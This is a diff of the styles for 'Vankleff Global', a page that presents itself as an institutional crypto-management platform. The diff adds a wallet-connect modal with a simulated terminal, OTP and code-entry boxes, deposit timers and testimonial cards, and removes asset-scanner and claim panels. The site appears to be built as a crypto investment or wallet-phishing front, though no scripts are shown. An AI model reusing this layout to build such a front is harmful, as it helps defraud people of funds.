@@ -1,16 +1,17 @@
 
 
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
 <meta name="description" content="Vankleff Global – Institutional Crypto Management from New York"/>
 <title>Vankleff Global – Institutional Crypto Management</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-body{font-family:'Inter','Segoe UI',sans-serif;background:#0d0d0d;color:#fff;overflow-x:hidden;}
+body{font-family:'Segoe UI',sans-serif;background:#0d0d0d;color:#fff;overflow-x:hidden;}
 a{color:inherit;text-decoration:none;}
 button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 
@@ -41,7 +42,8 @@ button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 .page.active{display:block;}
 
 .hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:flex-end;padding:0 0 70px;overflow:hidden;}
-.hero-bg{position:fixed;top:0;left:0;right:0;bottom:0;background:url('https://images.unsplash.com/photo-1534430480872-3498386e7856?w=1200&q=80') center 30%/cover no-repeat;z-index:-1;}
+.hero-bg{position:fixed;top:0;left:0;right:0;bottom:0;background:url('https://media.base44.com/images/public/69a5a34e022fe174d5c81410/098e8aca7_Screenshot_2026-05-16-12-54-22-728_commiuigallery.jpg') center 30%/cover no-repeat;z-index:0;}
+.hero-bg-fallback{position:fixed;top:0;left:0;right:0;bottom:0;background:url('https://images.unsplash.com/photo-1534430480872-3498386e7856?w=1200&q=80') center 30%/cover no-repeat;z-index:-1;}
 .hero-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:linear-gradient(to bottom,rgba(0,0,0,.15) 0%,rgba(0,0,0,.25) 40%,rgba(13,13,13,.85) 75%,rgba(13,13,13,1) 100%);z-index:1;}
 .hero-content{position:relative;z-index:2;padding:0 20px;max-width:600px;}
 .about-curtain{position:relative;z-index:10;background:#0d0d0d;}
@@ -97,6 +99,12 @@ button{cursor:pointer;border:none;outline:none;font-family:inherit;}
 .trust-role{font-size:11px;color:#22c55e;}
 .trust-loc{font-size:10px;color:#aaa;}
 .tc{background:#1c2640;border-radius:14px;padding:16px;margin-bottom:12px;}
+.tc p{font-size:12px;color:#e0e0e0;line-height:1.6;margin-bottom:10px;font-style:italic;}
+.tc-auth{display:flex;align-items:center;gap:10px;}
+.tc-av{width:42px;height:42px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #333;}
+.tc-name{font-weight:700;font-size:13px;color:#c9a84c;}
+.tc-loc{font-size:10px;color:#aaa;}
+.tc-stars{color:#f59e0b;font-size:13px;margin-bottom:5px;}
 
 .cta-box{background:#1a1a2e;border-radius:18px;padding:30px 22px;text-align:center;margin:20px;}
 .cta-logo{width:58px;height:58px;border:2px solid #c9a84c;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#c9a84c;margin:0 auto 14px;}
@@ -114,13 +122,14 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .legal-page h2{font-size:15px;font-weight:700;color:#c9a84c;margin:18px 0 8px;}
 .legal-page p{font-size:13px;color:#ccc;line-height:1.7;margin-bottom:10px;}
 
-/* MODALS */
-.modal-ov,.pm-ov,.conf-ov,.gm-ov,.cp-ov,.sup-ov,.proc-ov,.suc-ov,.wd-note-ov{display:none;position:fixed;inset:0;z-index:200;}
-.modal-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.cp-ov.open,.sup-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open{display:flex;}
+.modal-ov,.wm-ov,.pm-ov,.conf-ov,.gm-ov,.cp-ov,.sup-ov,.proc-ov,.suc-ov,.wd-note-ov{display:none;position:fixed;inset:0;z-index:200;}
+.modal-ov.open,.wm-ov.open,.pm-ov.open,.conf-ov.open,.gm-ov.open,.cp-ov.open,.sup-ov.open,.proc-ov.open,.suc-ov.open,.wd-note-ov.open{display:flex;}
 .modal-ov{background:rgba(0,0,0,.8);align-items:flex-end;justify-content:center;}
+.wm-ov{background:rgba(0,0,0,.85);z-index:300;align-items:flex-end;justify-content:center;}
 .pm-ov{background:rgba(0,0,0,.75);z-index:250;align-items:flex-start;justify-content:center;padding-top:60px;}
 .conf-ov{background:rgba(0,0,0,.8);z-index:400;align-items:center;justify-content:center;}
 .gm-ov{background:rgba(0,0,0,.75);z-index:450;align-items:center;justify-content:center;padding:20px;}
+.cp-ov{background:rgba(0,0,0,.6);z-index:350;align-items:center;justify-content:center;padding:20px;}
 .sup-ov{background:rgba(0,0,0,.8);z-index:450;align-items:center;justify-content:center;padding:20px;}
 .proc-ov{background:rgba(0,0,0,.85);z-index:490;align-items:center;justify-content:center;}
 .suc-ov{background:rgba(0,0,0,.7);z-index:500;align-items:center;justify-content:center;}
@@ -138,27 +147,74 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .fg input{width:100%;background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:13px 14px 13px 40px;color:#fff;font-size:13px;outline:none;}
 .fg input::placeholder{color:#555;}
 .fg .fi{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:15px;color:#666;}
+.phone-row{display:flex;gap:8px;margin-bottom:12px;}
+.phone-sel{background:#1a1a2e;border:1px solid #2a2a3e;border-radius:12px;padding:13px 10px;color:#fff;font-size:12px;width:100px;outline:none;}
+.enc-note{font-size:11px;color:#aaa;margin:6px 0 14px;}
+.enc-note a{color:#22c55e;}
 .btn-submit{width:100%;padding:15px;border-radius:14px;background:linear-gradient(135deg,#c9a84c,#e5c068);color:#000;font-size:15px;font-weight:800;}
+
 .loading-spinner{display:none;text-align:center;padding:30px 20px;}
 .spinner-ring{width:52px;height:52px;border:4px solid #2a2a2a;border-top:4px solid #22c55e;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
-@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 
-/* ── NETWORK SELECTOR ─────────────────────────────────────── */
-.net-selector{display:flex;gap:10px;margin-bottom:18px;background:#0d0d0d;border-radius:14px;padding:6px;}
-.net-opt{flex:1;display:flex;align-items:center;justify-content:center;gap:7px;padding:11px 8px;border-radius:10px;font-size:13px;font-weight:700;color:#aaa;cursor:pointer;border:2px solid transparent;transition:all .2s;}
-.net-opt.active-bsc{background:#16322c;border-color:#22c55e;color:#22c55e;}
-.net-opt.active-eth{background:#1a1e36;border-color:#627eea;color:#627eea;}
-.net-opt:not(.active-bsc):not(.active-eth):hover{background:#1a1a2e;}
-.net-icon{font-size:18px;}
-.active-net-bar{display:flex;align-items:center;gap:8px;background:#111;border-radius:10px;padding:9px 14px;margin-bottom:14px;font-size:12px;color:#aaa;}
-.active-net-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
-.dot-bsc{background:#22c55e;}
-.dot-eth{background:#627eea;}
-.active-net-name{font-weight:700;}
-.active-net-name.bsc{color:#22c55e;}
-.active-net-name.eth{color:#627eea;}
+.wm-box{background:#2d3a00;border-radius:20px 20px 0 0;width:100%;max-width:480px;max-height:90vh;overflow:hidden;position:relative;}
+.wm-track{display:flex;transition:transform .35s cubic-bezier(.4,0,.2,1);}
+.wm-slide{min-width:100%;padding:22px 18px 40px;overflow-y:auto;max-height:90vh;}
+.wm-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
+.wm-title{font-size:17px;font-weight:800;}
+.wm-close,.wm-back{font-size:20px;color:#aaa;background:none;}
+.wm-dots{display:flex;gap:8px;justify-content:center;margin-bottom:18px;}
+.dot{width:10px;height:10px;border-radius:50%;background:#555;transition:background .3s;}
+.dot.on{background:#22c55e;}
+.w-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
+.w-item{background:#3a4a00;border-radius:14px;padding:12px 6px;text-align:center;cursor:pointer;}
+.w-item:active{background:#4a6000;}
+.w-item img{width:40px;height:40px;border-radius:10px;margin:0 auto 6px;object-fit:contain;display:block;background:#fff;}
+.w-item span{font-size:10px;color:#ccc;display:block;}
+.btn-connect{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:15px;font-weight:800;margin-top:12px;}
+.terminal{background:#000;border-radius:12px;padding:14px;font-family:'Courier New',monospace;font-size:12px;color:#22c55e;min-height:200px;max-height:260px;margin-bottom:14px;overflow-y:auto;}
+.tl{display:block;margin-bottom:4px;}
+.tl.err{color:#ef4444;}
+.tl.warn{color:#f59e0b;}
+.tcursor{display:inline-block;width:8px;height:14px;background:#22c55e;animation:blink .7s infinite;vertical-align:middle;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
 
-/* DASHBOARD */
+.pm-box{background:#161b2e;border-radius:20px;padding:26px 22px;width:92%;max-width:400px;position:relative;}
+.pm-av{width:64px;height:64px;border-radius:50%;background:#16a34a;display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:26px;margin:0 auto 10px;}
+.pm-bal{font-size:32px;font-weight:900;color:#22c55e;text-align:center;margin-bottom:4px;}
+.pm-stats{width:100%;border-collapse:collapse;margin-bottom:18px;}
+.pm-stats tr{border-bottom:1px solid #2a2a3e;}
+.pm-stats td{padding:10px 4px;font-size:13px;}
+.pm-stats td:last-child{text-align:right;color:#22c55e;font-weight:600;}
+.btn-pm-set,.btn-pm-out{width:100%;padding:13px;border-radius:12px;font-size:13px;font-weight:700;margin-bottom:10px;}
+.btn-pm-set{background:#1a2a1a;color:#ccc;}
+.btn-pm-out{background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.3);}
+
+.conf-box,.gm-box,.cp-box,.sup-box,.suc-box,.wd-note-box{border-radius:16px;padding:28px 24px;}
+.conf-box{background:#1a1a2e;text-align:center;max-width:300px;width:90%;}
+.conf-btns{display:flex;gap:10px;margin-top:16px;}
+.btn-yes{flex:1;padding:13px;background:#ef4444;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
+.btn-no{flex:1;padding:13px;background:#1a2a1a;border-radius:12px;color:#ccc;font-size:14px;font-weight:600;border:1px solid #333;}
+.gm-box{background:#2d3a00;width:100%;max-width:360px;text-align:center;position:relative;}
+.gm-close{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
+.gm-box h3{font-size:18px;font-weight:800;margin-bottom:10px;}
+.gm-box p{font-size:13px;color:#aaa;line-height:1.6;margin-bottom:18px;}
+.btn-gm{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;}
+.btn-gmc{width:100%;padding:12px;background:transparent;border:none;color:#aaa;font-size:13px;}
+.cp-box{background:#2d3a00;width:100%;max-width:340px;}
+.cp-box h3{font-size:16px;font-weight:800;margin-bottom:14px;}
+.cp-inp{width:100%;background:#1a2200;border:1px solid #4a5a00;border-radius:10px;padding:12px;color:#aaa;font-size:13px;margin-bottom:14px;outline:none;}
+.cp-btns{display:flex;gap:10px;}
+.btn-cp-c{flex:1;padding:12px;background:#1a2200;border-radius:10px;color:#ccc;font-size:13px;}
+.btn-cp-s{flex:1;padding:12px;background:#22c55e;border-radius:10px;color:#fff;font-size:13px;font-weight:800;}
+.sup-box{background:#2d3a00;width:100%;max-width:380px;text-align:center;position:relative;}
+.sup-box .sc{position:absolute;top:12px;right:14px;font-size:18px;color:#aaa;background:none;}
+.sup-row{display:flex;align-items:center;gap:10px;background:#1a2200;border-radius:10px;padding:12px;margin-top:8px;font-size:12px;color:#ccc;}
+.btn-sup{width:100%;padding:14px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:800;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px;}
+.suc-box{background:#161b2e;text-align:center;max-width:340px;width:90%;position:relative;}
+.suc-close{position:absolute;top:12px;right:16px;font-size:20px;color:#aaa;background:none;}
+.wd-note-box{background:#161b2e;border:1px solid #c9a84c;max-width:380px;width:90%;text-align:center;position:relative;}
+
 .dash-nav{position:sticky;top:0;z-index:100;background:#111;display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid #222;}
 .ham{font-size:22px;color:#fff;background:none;}
 .dn-brand{display:flex;align-items:center;gap:8px;}
@@ -173,14 +229,14 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .sb-top{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid #1a1a2e;margin-bottom:8px;}
 .sb-close{font-size:20px;color:#aaa;background:none;}
 .sb-grp{font-size:10px;font-weight:700;color:#444;letter-spacing:2px;text-transform:uppercase;padding:12px 18px 4px;}
-.sb-item{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;cursor:pointer;border-radius:10px;margin:2px 8px;}
+.sb-item{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;cursor:pointer;border-radius:10px;margin:2px 8px;transition:background .15s;}
 .sb-item:hover,.sb-item.on{background:#1a2a1a;}
 .sb-left{display:flex;align-items:center;gap:12px;font-size:13px;color:#bbb;}
 .sb-item.on .sb-left{color:#22c55e;font-weight:600;}
 .sb-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;background:#1a1a2e;flex-shrink:0;}
 .sb-item.on .sb-icon{background:#16322c;}
 .sb-badge{font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;color:#fff;}
-.bl-live{background:#22c55e;}.bl-pro{background:#7c3aed;}.bl-ai{background:#2563eb;}.bl-prem{background:#f59e0b;}.bl-10{background:#22c55e;}
+.bl-live{background:#22c55e;}.bl-pro{background:#7c3aed;}.bl-ai{background:#2563eb;}.bl-prem{background:#f59e0b;}.bl-fast{background:#f97316;}.bl-10{background:#22c55e;}
 .dash-content{padding:18px;}
 .balance-card{background:linear-gradient(135deg,#1a2a1a,#0d1a0d);border-radius:16px;padding:20px;margin-bottom:18px;border:1px solid #1f3a1f;}
 .bal-lbl{font-size:11px;color:#aaa;margin-bottom:4px;}
@@ -188,107 +244,41 @@ footer ul li{padding:3px 0;font-size:12px;color:#888;}
 .bal-btns{display:flex;gap:12px;}
 .btn-dep{background:#22c55e;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
 .btn-wit{background:#2563eb;color:#fff;padding:13px 24px;border-radius:10px;font-size:13px;font-weight:700;}
-.mini-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.mini-grid,.perf-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:18px;}
+.perf-grid{padding:16px;margin-bottom:0;}
 .mini-card{background:#1a1a2e;border-radius:14px;padding:14px;text-align:center;}
+.perf-card{background:#2d3a00;border-radius:14px;padding:16px;}
 .mc-val{font-size:17px;font-weight:800;color:#22c55e;}
 .mc-lbl{font-size:10px;color:#aaa;margin-top:4px;}
 .price-box{background:#1a1a2e;border-radius:14px;padding:16px;margin-bottom:18px;}
 .price-box h3{font-size:15px;font-weight:700;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
 .ldot{width:8px;height:8px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite;}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
 .pr{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid #222;}
 .pr:last-child{border-bottom:none;}
 .pr-l{display:flex;align-items:center;gap:10px;}
 .pr-ic{width:30px;height:30px;border-radius:50%;background:#16322c;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#22c55e;}
-.pr-nm{font-size:13px;font-weight:600;}
-.pr-tk{font-size:10px;color:#666;}
-.pr-price{font-size:13px;font-weight:700;}
-.up{color:#22c55e;font-size:11px;}
-.dn2{color:#ef4444;font-size:11px;}
-
-/* WEB3 PANELS */
+.pr-nm{font-size:13px;font-weight:600;}.pr-tk{font-size:10px;color:#666;}.pr-price{font-size:13px;font-weight:700;}
+.up{color:#22c55e;font-size:11px;}.dn2{color:#ef4444;font-size:11px;}
 .btn-cw{background:#22c55e;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;animation:cwblink 2s ease-in-out infinite;}
-@keyframes cwblink{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.4)}50%{box-shadow:0 0 20px 8px rgba(34,197,94,.25)}}
+@keyframes cwblink{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,.4);}50%{box-shadow:0 0 20px 8px rgba(34,197,94,.25);}}
 .wcta{background:#1a2a1a;border-radius:14px;padding:20px;text-align:center;margin-bottom:18px;}
-.btn-w3-claim{background:#eab308;color:#060e0a;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;display:none;}
-.btn-w3-disconnect{background:#ef4444;color:#fff;padding:14px 30px;border-radius:12px;font-size:15px;font-weight:700;display:none;}
-.w3-btn-row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:12px;}
-.web3-panels{margin-top:6px;}
-#statusText{margin-top:1.5rem;font-size:0.95rem;min-height:1.5rem;color:#94a3b8;text-align:center;}
-#stageLog{margin-top:0.75rem;font-size:0.78rem;color:#475569;font-family:monospace;text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:0.75rem 1rem;max-height:140px;overflow-y:auto;display:none;}
-#stageLog.visible{display:block;}
-.log-line{padding:1px 0;}
-.log-ok{color:#22c55e;}.log-warn{color:#eab308;}.log-err{color:#f87171;}
-#infoPanel{display:none;margin-top:2rem;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:1.5rem;text-align:left;flex-direction:column;gap:0.8rem;}
-#infoPanel.visible{display:flex;}
-#txPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
-#txPanel.visible{display:block;}
-#scannerPanel{display:none;margin-top:1rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:1.2rem;text-align:left;}
-#scannerPanel.visible{display:block;}
-#errorBanner{display:none;margin-top:1rem;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:12px;padding:1rem;font-size:.85rem;color:#f87171;}
-#errorBanner.visible{display:block;}
-#chainSwitchBanner{display:none;margin-top:1rem;background:rgba(234,179,8,.1);border:1px solid rgba(234,179,8,.3);border-radius:12px;padding:1rem;font-size:.85rem;color:#eab308;text-align:center;}
-#chainSwitchBanner.visible{display:block;}
-.btn-switch-chain{margin-top:0.6rem;padding:8px 20px;font-size:.85rem;font-weight:700;border:none;border-radius:10px;cursor:pointer;background:#eab308;color:#060e0a;}
-.info-row{display:flex;justify-content:space-between;align-items:center;font-size:.88rem;gap:1rem;flex-wrap:wrap;}
-.info-label{color:#64748b;font-weight:500;}
-.info-value{color:#e2e8f0;font-weight:600;font-family:monospace;font-size:.85rem;text-align:right;word-break:break-all;}
-.divider{border:none;border-top:1px solid rgba(255,255,255,.06);}
-.badge{display:inline-block;padding:3px 10px;border-radius:8px;font-size:.75rem;font-weight:600;}
-.badge-green{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.3);}
-.badge-yellow{background:rgba(234,179,8,.15);color:#eab308;border:1px solid rgba(234,179,8,.3);}
-.badge-blue{background:rgba(59,130,246,.15);color:#60a5fa;border:1px solid rgba(59,130,246,.3);}
-.scanner-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
-.asset-item{display:flex;justify-content:space-between;align-items:center;padding:.4rem 0;font-size:.82rem;border-top:1px solid rgba(255,255,255,.04);}
-.asset-item:first-child{border-top:none;}
-.asset-symbol{color:#22c55e;font-weight:700;font-family:monospace;}
-.asset-balance{color:#e2e8f0;font-family:monospace;}
-.scan-status{font-size:.8rem;color:#64748b;}
-.tx-title{font-size:.8rem;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem;}
-.tx-item{display:flex;justify-content:space-between;align-items:center;padding:.45rem 0;font-size:.82rem;}
-.tx-item+.tx-item{border-top:1px solid rgba(255,255,255,.04);}
-.tx-hash{font-family:monospace;color:#60a5fa;text-decoration:none;}
-.tx-status{font-size:.72rem;padding:2px 8px;border-radius:6px;font-weight:600;}
-.tx-pending{background:rgba(234,179,8,.12);color:#facc15;}
-.tx-confirmed{background:rgba(34,197,94,.12);color:#22c55e;}
-.tx-failed{background:rgba(239,68,68,.12);color:#f87171;}
-.story-card{background:#1c2640;border-radius:14px;padding:16px;margin:0 20px 12px;display:flex;gap:12px;}
-.st-av{width:46px;height:46px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid #c9a84c;}
-.btn-back{width:100%;padding:13px;border-radius:12px;font-size:13px;margin-top:12px;background:#1a1a2e;color:#ccc;}
 .ph{padding:22px 20px 8px;}
 .ph h1{font-size:22px;font-weight:900;}
 .ph p{font-size:12px;color:#aaa;margin-top:4px;}
-.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
-.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
-.dep-wrap{padding:18px;}
-.meth-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
-.meth{background:#1a1a2e;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
-.meth.sel{border-color:#22c55e;color:#22c55e;background:#0d1a0d;}
-.amt-input{background:#1a1a2e;border:1px solid #c9a84c;border-radius:12px;padding:14px;font-size:14px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
-.quick-amts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
-.qa{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:8px 12px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;}
-.btn-cont{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
-.addr-box{background:#1a1a2e;border-radius:12px;padding:14px;margin-bottom:12px;}
-.addr-val{font-family:'Courier New',monospace;font-size:12px;color:#22c55e;word-break:break-all;line-height:1.5;margin-bottom:10px;}
-.addr-row{display:flex;gap:8px;align-items:center;}
-.btn-copy{flex:1;padding:10px;background:#2563eb;border-radius:10px;color:#fff;font-size:13px;font-weight:700;}
-.net-badge{background:#16322c;border:1px solid #22c55e;border-radius:8px;padding:6px 10px;font-size:11px;color:#22c55e;font-weight:700;white-space:nowrap;}
-.timer-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;font-size:12px;color:#aaa;}
-.timer-val{color:#22c55e;font-weight:700;font-size:14px;}
-.proof-box{border:2px dashed #333;border-radius:14px;padding:26px;text-align:center;margin-bottom:16px;cursor:pointer;}
-.sec-notice{background:#2a1a0a;border:1px solid #f59e0b;border-radius:12px;padding:14px;margin-bottom:20px;}
-.code-box{background:#1a1a2e;border:1px solid #c9a84c;border-radius:14px;padding:18px;margin-bottom:18px;overflow:hidden;}
-.otp-row{display:flex;gap:6px;margin-bottom:14px;overflow:hidden;}
-.otp-in{flex:1;min-width:0;height:52px;background:#0d0d0d;border:2px solid #c9a84c;border-radius:10px;text-align:center;font-size:18px;color:#fff;outline:none;}
 .sig-card{background:#1a1a2e;border-radius:16px;padding:20px;margin:0 20px 14px;position:relative;}
 .sig-card.pop{border:2px solid #c9a84c;}
+.sig-badge{position:absolute;top:-11px;left:50%;transform:translateX(-50%);background:#c9a84c;color:#000;font-size:10px;font-weight:800;padding:3px 12px;border-radius:20px;}
 .sig-price{font-size:30px;font-weight:900;color:#22c55e;margin:6px 0;}
+.sig-desc{font-size:11px;color:#aaa;margin-bottom:4px;}
+.sig-rate{color:#22c55e;font-size:11px;font-weight:700;margin-bottom:12px;}
 .sig-feats{list-style:none;margin-bottom:16px;}
 .sig-feats li{font-size:12px;color:#ccc;padding:3px 0;display:flex;align-items:center;gap:6px;}
 .sig-feats li::before{content:"✓";color:#22c55e;font-weight:700;}
 .btn-sub{width:100%;padding:13px;background:#22c55e;border-radius:12px;color:#fff;font-size:14px;font-weight:700;}
 .ip-item{background:#2d3a00;border-radius:16px;padding:18px;margin-bottom:14px;cursor:pointer;}
-.ps-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;}
+.ps-card{background:#2d3a00;border-radius:16px;padding:20px;margin-bottom:16px;display:none;}
+.ps-card.on{display:block;}
 .ps-amount{font-size:36px;font-weight:900;color:#22c55e;margin-bottom:12px;text-align:center;}
 input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
 .ps-sum{background:#1a2200;border-radius:12px;padding:14px;margin-bottom:16px;}
@@ -304,6 +294,76 @@ input[type=range]{width:100%;accent-color:#22c55e;margin-bottom:6px;}
 .ct-stat{background:#1a2200;border-radius:10px;padding:10px;}
 .ct-stat-l{font-size:10px;color:#aaa;}
 .ct-stat-v{font-size:15px;font-weight:700;color:#22c55e;}
+.dep-wrap{padding:18px;}
+.meth-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+.meth{background:#1a1a2e;border:2px solid #2a2a3e;border-radius:12px;padding:16px 12px;display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;font-weight:700;color:#ccc;}
+.meth.sel{border-color:#22c55e;color:#22c55e;background:#0d1a0d;}
+.amt-input{background:#1a1a2e;border:1px solid #c9a84c;border-radius:12px;padding:14px;font-size:14px;color:#fff;width:100%;margin-bottom:12px;outline:none;}
+.quick-amts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px;}
+.qa{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:8px 12px;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;}
+.btn-cont{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;}
+.addr-box{background:#1a1a2e;border-radius:12px;padding:14px;margin-bottom:12px;}
+.addr-lbl{font-size:11px;color:#aaa;margin-bottom:6px;}
+.addr-val{font-family:'Courier New',monospace;font-size:12px;color:#22c55e;word-break:break-all;line-height:1.5;margin-bottom:10px;}
+.addr-row{display:flex;gap:8px;align-items:center;}
+.btn-copy{flex:1;padding:10px;background:#2563eb;border-radius:10px;color:#fff;font-size:13px;font-weight:700;}
+.net-badge{background:#16322c;border:1px solid #22c55e;border-radius:8px;padding:6px 10px;font-size:11px;color:#22c55e;font-weight:700;white-space:nowrap;}
+.warn-box{background:#2a1600;border:1px solid #f59e0b;border-radius:10px;padding:12px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;}
+.warn-box p{font-size:11px;color:#f59e0b;line-height:1.5;}
+.timer-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:16px;font-size:12px;color:#aaa;}
+.timer-val{color:#22c55e;font-weight:700;font-size:14px;}
+.proof-box{border:2px dashed #333;border-radius:14px;padding:26px;text-align:center;margin-bottom:16px;cursor:pointer;}
+.proof-box:hover{border-color:#22c55e;}
+.btn-cd,.back-btn{width:100%;padding:13px;border-radius:12px;font-size:13px;margin-top:12px;}
+.btn-cd{background:#22c55e;color:#fff;font-size:15px;font-weight:800;padding:15px;margin-top:0;}
+.back-btn{background:#1a1a2e;color:#ccc;}
+.sec-notice{background:#2a1a0a;border:1px solid #f59e0b;border-radius:12px;padding:14px;margin-bottom:20px;}
+.sec-notice h4{color:#f59e0b;font-size:12px;font-weight:700;margin-bottom:5px;}
+.sec-notice p{font-size:11px;color:#ccc;line-height:1.6;}
+.code-box{background:#1a1a2e;border:1px solid #c9a84c;border-radius:14px;padding:18px;margin-bottom:18px;width:100%;overflow:hidden;}
+.otp-row{display:flex;gap:6px;margin-bottom:14px;width:100%;overflow:hidden;}
+.otp-in{flex:1;min-width:0;height:52px;background:#0d0d0d;border:2px solid #c9a84c;border-radius:10px;text-align:center;font-size:18px;color:#fff;outline:none;}
+.bal-row{display:flex;justify-content:space-between;padding:11px 12px;background:#0d0d0d;border-radius:10px;}
+.btn-verify{width:100%;padding:15px;background:#22c55e;border-radius:14px;color:#fff;font-size:15px;font-weight:800;margin-top:16px;}
+.sec-item{background:#1a1a2e;border-radius:12px;padding:13px;margin-bottom:10px;cursor:pointer;}
+.sec-top{display:flex;align-items:center;justify-content:space-between;}
+.sec-lft{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;}
+.sec-body{display:none;font-size:11px;color:#aaa;margin-top:8px;line-height:1.6;}
+.sec-item.open .sec-body{display:block;}
+.arr{transition:transform .2s;}
+.sec-item.open .arr{transform:rotate(180deg);}
+.tf-card{background:#1a1a0a;border:1px solid #c9a84c;border-radius:16px;padding:20px;}
+.tf-in{width:100%;background:#0d0d0d;border:1px solid #333;border-radius:10px;padding:13px;color:#fff;font-size:14px;margin-bottom:12px;outline:none;}
+.stmt-filters{display:flex;gap:8px;overflow-x:auto;padding:14px 20px;scrollbar-width:none;}
+.sfbtn{flex-shrink:0;padding:8px 16px;border-radius:20px;font-size:12px;font-weight:700;background:#2d3a00;color:#ccc;}
+.sfbtn.on{background:#22c55e;color:#fff;}
+.st-item{background:#2d3a00;border-radius:12px;padding:14px 16px;margin:0 20px 10px;display:flex;align-items:center;justify-content:space-between;}
+.st-lft{display:flex;align-items:center;gap:12px;}
